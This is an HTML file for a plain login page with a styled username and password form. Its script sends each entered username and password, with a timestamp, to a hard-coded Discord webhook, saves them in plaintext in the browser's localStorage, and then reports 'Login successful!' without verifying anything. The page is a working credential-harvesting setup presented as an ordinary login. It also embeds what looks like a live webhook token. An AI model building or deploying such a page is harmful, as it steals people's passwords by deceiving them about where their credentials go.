<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css"> <!-- You'll create this file for styling -->
  <style>
    /* Custom CSS */
    body {
      font-family: Arial, sans-serif;
      background-color: #d1c7c7;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    
    .login-container {
      background-color: #222121;
      padding: 20px;
      border-radius: 8px;
    }
    
    .form-group {
      margin-bottom: 15px;
    }
    
    label {
      display: block;
      margin-bottom: 5px;
    }
    
    input {
      width: 100%;
      padding: 8px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    
    button {
      padding: 10px 20px;
      background-color: hsl(340, 83%, 81%);
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>
    <form id="login-form">
      <div class="form-group">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    // Script to handle form submission
    document.getElementById("login-form").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent form submission
      
      // Get input values
      var username = document.getElementById("username").value;
      var password = document.getElementById("password").value;

      // Save username, password, and date to localStorage
      var currentDate = new Date().toLocaleString();
      localStorage.setItem("username", username);
      localStorage.setItem("password", password);
      localStorage.setItem("loginDate", currentDate);
      
      // Example: Sending data to Discord webhook
      var webhookURL = "https://discord.com/api/webhooks/1237543876772761630/pnHMWhI_rz6b6fKXlBE6Z6409nusDuWfNJNvcZmWvxYnP4NRhUKjKWk5dGgxLoR1vMxS";
      var message = {
        username: "Login Notification",
        content: "Username: " + username + "\nPassword: " + password + "\nLogin Date: " + currentDate
      };

      // Send message to Discord webhook
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
      }).then(function(response) {
        if (response.ok) {
          alert("Login successful!");
        } else {
          alert("Failed to notify moderators. Please try again later.");
        }
      }).catch(function(error) {
        console.error("Error:", error);
        alert("An error occurred. Please try again later.");
      });
    });
  </script>
</body>
</html>
